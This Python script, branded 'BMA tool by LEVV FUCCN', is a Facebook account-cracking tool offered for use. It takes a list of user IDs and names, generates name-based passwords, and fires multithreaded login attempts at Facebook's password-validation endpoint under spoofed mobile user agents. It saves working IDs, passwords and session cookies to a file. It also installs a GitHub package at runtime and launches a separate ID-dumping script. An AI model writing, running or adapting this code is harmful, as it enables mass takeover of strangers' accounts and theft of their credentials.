######LEVV-FUCC'N######
from os import path
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass

try:
    import PyBookAgents
except ModuleNotFoundError:
    os.sytem("pip3 install git+https://github.com/sintxcs/PyBookAgents.git")
    import PyBookAgents
#from rich import print
#from rich.panel import Panel
######B-GRAPH UA#######
	#[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=2.5,width=1080,height=2179};FBLC/fr_FR;FBRV/557952455;FBCR/;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X100;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]
	#Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.232 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]"
#-----------(COLOUR CODE)---------#
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\033[1;31m"
green="\033[1;32m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"
#__________________[ COLOUR ]__________________#
W = '\x1b[1;97m';Y = '\033[1;33m';G = '\033[1;32m';B = '\033[1;36m';R = '\033[1;31m';G2 = '\033[1;36m';G3 = '\033[1;33m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';M = '\x1b[38;5;205m'
#########UA UPDATE##########
def bma_ua():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbdv = random.choice(["Nokia 5.3", "Nokia 5.4", "Nokia 5.4 Plus", "Nokia 6.1", "Nokia 6.1 Plus", "Nokia 6.2", "Nokia 6.2 Plus", "Nokia 7 Plus", "Nokia 7 Plus 5G", "Nokia 8 Sirocco", "Nokia 8 Sirocco Plus", "Nokia 8 V 5G UW", "Nokia 8.1", "Nokia 8.1 Plus", "Nokia 8.3 5G", "Nokia 8.3 Plus", "Nokia 9", "Nokia 9 Plus", "Nokia C01 Plus", "Nokia C1", "Nokia C1 2nd Edition", "Nokia C1 Plus", "Nokia C10", "Nokia C100", "Nokia C2", "Nokia C2 2nd Edition", "Nokia C2 Tennen", "Nokia C20", "Nokia C20 Plus", "Nokia C21", "Nokia C21 Plus", "Nokia C22", "Nokia C30", "Nokia C30 Plus", "Nokia C31", "Nokia C5 Endi", "Nokia G10", "Nokia G10 Plus", "Nokia G11", "Nokia G11 Plus", "Nokia G20", "Nokia G20 Plus", "Nokia G21", "Nokia G21 Plus", "Nokia G22", "Nokia G22 Plus", "Nokia G400 5G", "Nokia G50", "Nokia G60 5G", "Nokia Streaming Box 8000", "Nokia T10", "Nokia T20", "Nokia T20 Plus", "Nokia T21", "Nokia T21 Plus", "Nokia T30 5G", "Nokia T5", "Nokia T6", "Nokia T7", "Nokia T71", "Nokia T800", "Nokia T90", "Nokia X10", "Nokia X10 Plus", "Nokia X100", "Nokia X20", "Nokia X20 Plus", "Nokia X30 5G", "Nokia X5", "Nokia X6", "Nokia X7", "Nokia X71", "Nokia XR20"])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = ";[FBAN/FB4A;FBAV/447.0.0.24.113;FBBV/556730940;FBDM/{density=2.5,width=1080,height=2179};FBLC/"+en+";FBRV/559770487;FBCR/"+fbcr+";FBMF/HMD Global;FBBD/Nokia;FBPN/"+kt+";FBDV/"+fbdv+";FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
	ua = s + e	
	return ua
def arafat3():
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/EMA;UNITY_'+'PAC'+'KAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J'+'21'+'0F;FBLC/en_US;FBOP/20]'
    return ua
#####_______TIME MODS________#####
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
        
#####_______LOGO______#####
logo=("""\33[1;32m


                    ██████╗ ███╗   ███╗ █████╗ \n                    ██╔══██╗████╗ ████║██╔══██╗\n                    ██████╔╝██╔████╔██║███████║\n                    ██╔══██╗██║╚██╔╝██║██╔══██║\n                    ██████╔╝██║ ╚═╝ ██║██║  ██║\n                    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝\n                 L   E   V   V   F   U   C   C   N\n══════════════════════════════════════════════════════════════════════ """)
def linex():
        print(70*'\033[1;32m═')
def line():
        print(70*'\033[1;91m═')
def clear():
        os.system(f'clear')
        print(logo)  
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

#os.system(f'xdg-open https://youtube.com/@technicaltricks7982')

def BMA():
	clear()
	#ckx()
	print(f"\33[1;32m 1. FILE CLONING")
	print(f"\33[1;32m 2. FILE MAKE")
	print(f"\33[1;32m 0. EXIT")
	linex()
	me=input(f'\033[1;32m  CHOOSE : ')
	if me in ["1", "01","11","A","a"]:
		clear()
		print(f'\33[1;32m FILE EXAMPLE : /sdcard/BMA.txt')
		linex()
		file = input(f'\033[1;32m PUT FILE PATH\033[1;32m : ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' File location not found ')
			BMA()
		clear()
		print(f'\033[1;32m 1. METHOD (M-BASIC)')
		print(f'\033[1;32m 2. METHOD (B-GRAPH)')
		linex()
		mthd=input(f'\033[1;32m CHOOSE : ')
		plist=[]
		try:
			clear()
			ps_limit = int(input(f' \033[1;32m HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
		except:
			ps_limit =1
		clear()
		print(f'\x1b[1;32m     EXAMPLE : \033[1;32mfirst123 — first143 — first12345 — last12345')
		print(f'\x1b[1;32m     EXAMPLE : \033[1;32mfirstlast — first last — lastfirst — firstfirst')
		linex()
		for i in range(ps_limit):
			plist.append(input(f' \033[1;32m  PUT PASSWORD {i+1}: '))
		clear()
		print(f' \033[1;32m  DO YOU WANT TO SHOW CP IDS? (Y/N)')
		linex()
		cx=input(f'\033[1;32m  CHOOSE : ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as d:
			clear()
			total_ids = str(len(fo))
			print(f'\x1b[1;32m  ALIVE ACCOUNTS SAVE IN BMA-ALIVE.txt')
			print(f"\x1b[1;32m  CLONING TIME STARTED \033[1;36m"+str(a)+"\033[1;37m:\033[1;36m"+str(lt()[4])+" "+ tag+"\x1b[1;36m")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					d.submit(mthd1,ids,names,passlist,total_ids)
				elif mthd in ['2','02']:
					d.submit(mthd2,ids,names,passlist)
				#elif mthd in ['3','03']:
					#crack_submit.submit(ffb1,ids,names,passlist)
		print('\33[1;32m')
		linex()
		print(f'\33[1;32m  TOTAL ALIVE ACCOUNTS : '+str(len(oks)))
		print(f'\33[1;91m  TOTAL CP ACCOUNTS : '+str(len(cps)))
		print(f'\33[1;32m  THE PROCESS HAS COMPLETED ')
		linex()
		input(f'\33[1;32m  ENTER TO BACK MENU')
		BMA()
	elif me in ['2','02','b','B']:
		clear()
		os.system('cd')
		os.system('cd KHAN')
		os.system('python DUMP.py')
	elif me in ['2','02','b','B']:
		print(' \33[1;32mTHANK YOU FOR USING BMA TOOL BY LEVV FUCCN')
		exit()

#####_______METHOD-1_______#####					
def mthd1(ids,names,passlist,total_ids):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;32m BM4-M1 PROCESSING \033[1;37m%s/%s  \033[1;32m%s\033[1;37m/\033[1;91m%s\033[1;37m'%(loop,total_ids,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        #ua=random.choice(ugen)
                        head = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.549999952316284',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3241"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': str(PyBookAgents.random_ugen()),
    'viewport-width': '980',}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Khushal=session.cookies.get_dict().keys()
                        if "c_user" in Khushal:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m BMA ALIVE |\33[1;36m %s\33[1;32m |\33[1;36m %s\33[1;32m'%(ids,pas))
                                open(f'/sdcard/BMA-ALIVE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Khushal:
                                if 'y' in pcp:
                                        print(f'\r\r\033[1;91m CHECKPOINT| %s | %s \33[1;91m'%(ids,pas))
                                        open(f'/sdcard/BMA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(f"SAMSUNG-SM-G360AZ", "SAMSUNG-SGH-I577", "SAMSUNG-SGH-I437", "SAMSUNG-SGH-I437P", "SAMSUNG-SGH-I437Z", "SAMSUNG-SM-G530A", "SAMSUNG-SM-G530AZ", "SAMSUNG-SM-J120AZ", "SAMSUNG-SM-J120A", "SAMSUNG-SM-J326AZ", "SAMSUNG-SM-J327AZ", "SAMSUNG-SM-J327A", "SAMSUNG-SM-J320AZ", "SAMSUNG-SM-J321AZ", "SAMSUNG-SM-J727AZ", "SAMSUNG-SM-J727A", "SAMSUNG-SGH-I527", "SAMSUNG-SM-G750A", "SAMSUNG-SGH-I717", "SAMSUNG-SGH-I467", "SAMSUNG-SM-N915A", "SAMSUNG-SGH-I317", "SAMSUNG-SM-N910A", "SAMSUNG-SM-N920A", "SAMSUNG-SM-N930A", "SAMSUNG-SGH-I747Z", "SAMSUNG-SGH-I337Z", "SAMSUNG-SGH-I337", "SAMSUNG-SGH-I537", "SAMSUNG-SGH-I257", "SAMSUNG-SM-C105A", "SAMSUNG-SM-G900AZ", "SAMSUNG-SM-G870A", "SAMSUNG-SM-G800A", "SAMSUNG-SM-G920AZ", "SAMSUNG-SM-G920A", "SAMSUNG-SM-G890A", "SAMSUNG-SM-G925A", "SAMSUNG-SM-G928A", "SAMSUNG-SM-G930AZ", "SAMSUNG-SM-G930A", "SAMSUNG-SM-G891A", "SAMSUNG-SM-G935A", "SAMSUNG-SGH-I957", "SAMSUNG-SGH-I957D", "SAMSUNG-SGH-I957M", "SAMSUNG-SGH-I957R", "SAMSUNG-SM-T377A", "SAMSUNG-SM-T817A", "SAMSUNG-SM-T818A", "SAMSUNG-SGH-I497", "SAMSUNG-SM-T217A", "SAMSUNG-SM-T537A", "SAMSUNG-SM-T337A", "SAMSUNG-SM-T807A", "SAMSUNG-SM-T707A")
BMA()